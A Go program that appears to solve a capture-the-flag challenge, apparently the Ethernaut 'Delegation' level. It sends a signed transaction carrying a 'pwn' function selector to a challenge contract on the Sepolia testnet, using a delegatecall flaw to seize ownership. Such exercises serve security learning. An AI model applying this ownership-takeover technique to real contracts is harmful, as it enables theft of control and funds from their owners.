package main

import (
	"context"
	"crypto/ecdsa"
	"log"
	"math/big"

	"github.com/ethereum/go-ethereum/accounts/abi"
	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
)

type DelegationPuzzle struct{}

func (*DelegationPuzzle) Execute(rpcClient *ethclient.Client, chainId *big.Int,
	privateKey *ecdsa.PrivateKey, accountAddress common.Address) error {
	instanceAddress := common.HexToAddress("0x4aF9Ef7B4C8E130946D15099B3330b72E344e5dF")

	keyedTransactor, _ := bind.NewKeyedTransactorWithChainID(privateKey, chainId)

	rawAbi := abi.ABI{
		Methods: make(map[string]abi.Method),
	}

	keyedTransactor.Value = big.NewInt(1)
	keyedTransactor.GasLimit = 500000

	rawAbi.Methods["pwn"] = abi.NewMethod("pwn", "pwn", abi.Function, "", false, false, abi.Arguments{}, abi.Arguments{})

	nonce, _ := rpcClient.PendingNonceAt(context.Background(), crypto.PubkeyToAddress(privateKey.PublicKey))
	gasFeeCap, _ := rpcClient.SuggestGasPrice(context.Background())
	gasTipCap, _ := rpcClient.SuggestGasTipCap(context.Background())

	txn := types.MustSignNewTx(privateKey, types.LatestSignerForChainID(chainId), &types.DynamicFeeTx{
		ChainID:   chainId,
		Nonce:     nonce,
		Gas:       50_000,
		To:        &instanceAddress,
		Data:      rawAbi.Methods["pwn"].ID,
		GasFeeCap: gasFeeCap,
		GasTipCap: gasTipCap,
	})

	if err := rpcClient.SendTransaction(context.Background(), txn); err != nil {
		log.Println(err)
		return err
	}

	bind.WaitMined(context.Background(), rpcClient, txn)

	log.Println("transaction completed, https://sepolia.etherscan.io/tx/" + txn.Hash().Hex())
	return nil
}
